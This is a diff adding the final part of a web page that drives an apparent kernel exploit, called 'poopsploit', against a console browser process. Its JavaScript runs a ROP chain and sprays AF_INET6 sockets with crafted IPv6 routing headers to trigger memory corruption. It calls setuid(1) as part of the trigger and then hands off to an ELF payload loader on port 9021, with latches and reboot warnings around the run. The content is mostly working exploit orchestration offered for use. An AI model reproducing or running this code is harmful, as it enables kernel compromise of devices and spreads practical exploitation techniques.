+        + "-proof=" + (PROOF || "none") + "-payload=" + (cfg.payload || "none")
+        + "-stalledAt=" + (STALLED_AT || "none"));
+    lockNav(true);
+    runInFlight = true;
+    try {
+        if (!bootChainReady) await bootChain();
+        await refreshConsoleNetworkInfo();
+
+        await chooseCore();
+
+        makeContext();
+        const self = await engine.H.thrSelf("driver");
+        driver.tid = self.tid;
+        const r0 = await engine.H.readRtprio("driver-original");
+        driver.origPrioType = r0.type;
+        driver.origPrio = r0.prio;
+        const pid = await sys(0x014);
+        driver.pid = pid.failed ? 0 : pid.s32;
+        flushMark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid
+            + "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType
+            + "/" + driver.origPrio + "-core=" + driver.core);
+
+        flushMark("PRE-FD-BASELINE", "next=socket(AF_UNIX,SOCK_STREAM)");
+        const first = await sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
+        if (!first.failed) {
+            state.fdBaseline = first.s32;
+            await sys(0x006, state.fdBaseline);
+        }
+        flushMark("FD-BASELINE", "fd=" + state.fdBaseline);
+
+        vitals(vitalsText("about to open "));
+        cfgEl.textContent =
+            "trigger: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? "   burn: " + cfg.burn : "")
+            + "   |   stage-0 attempts: " + cfg.attempts
+            + "   |   twin scan: " + (PK ? PK.MAX_ROUNDS_TWIN : 10)
+            + " rounds at BATCH 1 (twin_lib REFUSES batch>1 once a trigger "
+            + "exists)\n"
+            + "spray bank: " + cfg.sockets + " AF_INET6 sockets x 360-byte "
+            + "type-0 routing header (poops.c:38, :45)\n"
+            + "target core " + driver.core + " -- " + driver.coreWhy + "\n"
+            + "driver tid " + (driver.tid || "unknown") + " in pid " + driver.pid
+            + "; will put back mask " + driver.origMaskHex + " and rtprio "
+            + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";
+
+        stage("running the ladder -- one row at a time");
+        try {
+            await runLadder();
+            sendRemoteEvents(false);
+        } finally {
+            if (chainDead)
+                danger("cleanup impossible: the ROP chain died at '" + chainDead
+                    + "'.\nUp to " + (engine ? engine.TW.S.n : 0) + " AF_INET6 "
+                    + "sockets, their 360-byte kernel routing headers, twelve "
+                    + "realtime kernel threads pinned to core " + driver.core
+                    + ", and this WebProcess's raised fd limit are all still " + "live, and NOTHING in a later page load can reach a " + "descriptor or a thread in a process it does not own"
+                    + (driver.tid
+                        ? "\nThe driver thread is tid " + driver.tid + " in pid "
+                        + driver.pid + " and that has been written down: a " + "later load CAN restore its affinity and priority by " + "explicit TID"
+                        : "")
+                    + "\nREBOOT.");
+        }
+    } finally {
+        runInFlight = false;
+        lockNav(false);
+    }
+}
+
+async function clearMain() {
+    const before = await latch.read();
+    const after = await latch.clear();
+    stage(before.set
+        ? "one-shot latch CLEARED. It was set by: " + (before.detail || "?")
+        : "the latch was not set; nothing to clear.", "ok");
+    summaryEl.textContent =
+        "before: " + JSON.stringify(before) + "\nafter:  " + JSON.stringify(after)
+        + (ARMED ? "\n\n?go=1 was present on this URL and was IGNORED: ?clear=1 "
+            + "is checked first and returns." : "")
+        + "\n\nNOTHING else was done";
+    renderNav(STALLED_AT, false);
+}
+
+function renderNav() {
+    navEl.textContent = "";
+    navEl.style.display = "none";
+}
+
+function lastRunText() {
+    if (!LAST_RUN) return "";
+    const age = Math.round((Date.now() - (LAST_RUN.ts || 0)) / 1000);
+    return "\nLAST recorded run (" + age + " s ago, trigger=" + LAST_RUN.trigger
+        + "): " + (LAST_RUN.stoppedAt ? "stopped at '" + LAST_RUN.stoppedAt + "'"
+            : "completed")
+        + ", " + LAST_RUN.pass + " pass / " + LAST_RUN.fail + " fail"
+        + (LAST_RUN.reboot ? "\n  that run'S verdict was: REBOOT." : "")
+        + (LAST_RUN.triggered ? "\n  the trigger fired: " + LAST_RUN.triggered
+            : "")
+        + (LAST_RUN.corrupt ? "\n  an alias was observed: " + LAST_RUN.corrupt
+            : "")
+        + (LAST_RUN.triplets ? "\n  triplet established: " + LAST_RUN.triplets
+            : "")
+        + (LAST_RUN.setuidCalls ? "\n  setuid(1) was called "
+            + LAST_RUN.setuidCalls + " time(s) -- IRREVERSIBLE for that boot, "
+            + "so the trigger's own precondition (a fresh, singly-referenced "
+            + "cred) no longer holds in that WebProcess" : "")
+        + (LAST_RUN.chainDead ? "\n  chain died at '" + LAST_RUN.chainDead + "'"
+            : "")
+        + (LAST_RUN.latchDetail ? "\n  latch detail recorded by that run: "
+            + LAST_RUN.latchDetail : "");
+}
+
+(async function entry() {
+
+    screenLine("poopsploit -- reading the one-shot safety latch");
+
+    if (PRODUCTION_REQUEST_ERROR) {
+        renderNav("", false);
+        stage("Production request refused: " + PRODUCTION_REQUEST_ERROR, "bad");
+        summaryEl.textContent = "NOTHING was cleared or executed.";
+        flushMark("POOPS-PRODUCTION-REFUSED", PRODUCTION_REQUEST_ERROR);
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (STAGE5_REQUEST_ERROR) {
+        renderNav("", false);
+        stage("Stage 5 request refused: " + STAGE5_REQUEST_ERROR, "bad");
+        summaryEl.textContent = "NOTHING was cleared or executed.";
+        flushMark("POOPS-STAGE5-REFUSED", STAGE5_REQUEST_ERROR);
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (CLEARLATCH) {
+        renderNav("", false);
+        await clearMain();
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (REUSE_ELFLDR) {
+        screenLine("payloads -- checking ELF loader on port 9021");
+        stage("checking for an existing ELF loader on port 9021");
+        try {
+            await bootChain();
+            await refreshConsoleNetworkInfo();
+            if (await probeExistingElfLoader()) {
+                openExistingPayloadMenu();
+                sendRemoteEvents(false);
+                return;
+            }
+            flushMark("ELFLDR-REUSE-MISS", "127.0.0.1-port=9021-closed");
+            stage("no ELF loader found", "bad");
+            showLoaderPrompt();
+            sendRemoteEvents(false);
+            return;
+        } catch (err) {
+            const message = (err && err.message) || String(err);
+            stage("could not check port 9021: " + message, "bad");
+            flushMark("ELFLDR-REUSE-PROBE-FAILED", clean(message));
+            sendRemoteEvents(false);
+            return;
+        }
+    }
+
+    if (PRODUCTION_RUN) {
+        const runlogCleared = consumeStored(RUNLOG_KEY);
+        const progressCleared = consumeStored(PROGRESS_KEY);
+        const latchCleared = consumeStored(LATCH_KEY);
+        if (!runlogCleared || !progressCleared || !latchCleared) {
+            stage("Production run refused: stale state could not be cleared", "bad");
+            flushMark("POOPS-PRODUCTION-REFUSED", "stale-state-clear-unverified");
+            sendRemoteEvents(false);
+            return;
+        }
+        LAST_RUN = null;
+        STALLED_AT = "";
+        latchState = "clear";
+        flushMark("PRODUCTION-FRESH-BOOT-ASSERTED", "stale-state-cleared=1");
+    }
+
+    stage("checking the one-shot safety latch");
+    const l = await latch.read();
+    flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
+        + "-detail=" + clean(l.detail || ""));
+
+    const refreshReady = canRefreshCheckpoint(LAST_RUN);
+    const stage0ProofReady = canStartStage0Proof(LAST_RUN);
+    const stage1ProofReady = canStartStage1Proof(LAST_RUN);
+    const stage2ProofReady = canStartStage2Proof(LAST_RUN);
+    const stage3ProofReady = canStartStage3Proof(LAST_RUN);
+    const stage4ProofReady = canStartStage4Proof(LAST_RUN);
+    const stage5DryProofReady = canStartStage5Proof(
+        LAST_RUN, STAGE5_DRY_PROOF, "dry");
+    const stage5LiveProofReady = canStartStage5Proof(
+        LAST_RUN, STAGE5_LIVE_PROOF, "1");
+    const stage5ProofReady = stage5DryProofReady || stage5LiveProofReady;
+    const proofRequested = !!PROOF;
+    const proofReady = stage0ProofReady || stage1ProofReady || stage2ProofReady
+        || stage3ProofReady || stage4ProofReady || stage5ProofReady;
+    if (stage5ProofReady && !l.set) {
+        stage("armed " + PROOF_TITLE
+            + " proof refused: clean checkpoint latch is missing", "bad");
+        flushMark("POOPS-STAGE5-REFUSED", "checkpoint-latch-missing");
+        sendRemoteEvents(false);
+        return;
+    }
+    if (proofRequested && !proofReady) {
+        const proofName = PROOF_TITLE;
+        stage("armed " + proofName + " proof refused: no immediately preceding clean "
+            + "negative checkpoint record", "bad");
+        flushMark("POOPS-LATCHED", proofName.toLowerCase().replace(" ", "")
+            + "-proof-refused-no-clean-negative-record");
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (proofReady) {
+        if (!consumeStored(RUNLOG_KEY)) {
+            stage("armed proof refused: the clean checkpoint could not be consumed",
+                "bad");
+            flushMark("POOPS-LATCHED", PROOF
+                + "-proof-checkpoint-consume-failed");
+            sendRemoteEvents(false);
+            return;
+        }
+        flushMark("PROOF-CONSUMED", PROOF + "-rev=" + REV);
+    }
+
+    if (l.set && (refreshReady || proofReady)) {
+        flushMark("LATCH-AUTOCLEAR", (proofReady
+            ? "verified-clean-negative-to-" + PROOF + "-proof-rev="
+            : "verified-clean-negative-checkpoint-rev=")
+            + clean((LAST_RUN && LAST_RUN.rev) || "unknown"));
+        await latch.clear();
+        if (stage5ProofReady && !consumeStored(LATCH_KEY)) {
+            stage(PROOF_TITLE + " proof refused: latch clear could not be verified",
+                "bad");
+            flushMark("POOPS-STAGE5-REFUSED", "latch-clear-unverified");
+            sendRemoteEvents(false);
+            return;
+        }
+        stage(proofReady ? "clean negative checkpoint verified; armed "
+            + PROOF_TITLE + " proof"
+            : "previous clean negative checkpoint cleared on refresh", "ok");
+        l.set = false;
+    }
+
+    // ?auto=1 clears the latch instead of asking; reboot between runs
+    if (l.set && AUTOCLEAR) {
+        flushMark("LATCH-AUTOCLEAR", clean(l.detail || ""));
+        await latch.clear();
+        stage("latch was set and ?auto=1 cleared it, set by: "
+            + (l.detail || "(no detail)")
+            + "\nassumes the console has been rebooted since that run.");
+        l.set = false;
+    }
+
+    if (l.set) {
+        renderNav(STALLED_AT, true);
+        stage("the one-shot latch is set, by: " + (l.detail || "(no detail)")
+            + "\n\nre-arming is only safe after a run that failed in the " + "prologue: setuid(1) is irreversible for the boot and the trigger " + "needs a fresh singly-referenced cred");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-LATCHED", clean(l.detail || ""));
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (!ARMED) {
+        document.getElementById("arm").hidden = false;
+        renderNav(STALLED_AT, false);
+        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
+            + STALLED_AT + "'" : ""));
+        vitals(vitalsText("if armed with ?go=1 this page will open "));
+
+        if (cfg.trigger !== "none"
+            && !(cfg.trigger === "overflow" && cfg.burn !== "full")) {
+            showVerdict(true, "this selection will leave the console needing A " + "REBOOT.\n");
+            navEl.textContent = "";
+            link("?go=1&trigger=" + cfg.trigger
+                + (cfg.trigger === "overflow" ? "&burn=" + cfg.burn : ""),
+                "ARM  " + cfg.trigger.toUpperCase()
+                + (cfg.trigger === "overflow" ? " / BURN=" + cfg.burn : "")
+                + "  -- I accept that this console will need A REBOOT",
+                "one hot");
+
+            link("?trigger=none", "no -- go back to the negative control",
+                "extra");
+            link("../index.html", "back to poopsploit", "extra");
+        }
+        summaryEl.textContent = lastRunText()
+            + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
+        flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (STALLED_AT && !FROM && !ONLY.length) {
+
+        renderNav(STALLED_AT, false);
+        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
+            + "clear, so pick a row explicitly", "bad");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-STALLED", STALLED_AT);
+        sendRemoteEvents(false);
+        return;
+    }
+
+    renderNav("", false);
+    main().catch(err => {
+        const m = (err && err.message) || String(err);
+        stage("boot failed: " + m, "bad");
+        flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
+        sendRemoteEvents(false);
+        runInFlight = false;
+        lockNav(false);
+    });
+})();
+</script>
+</body>
+</html>
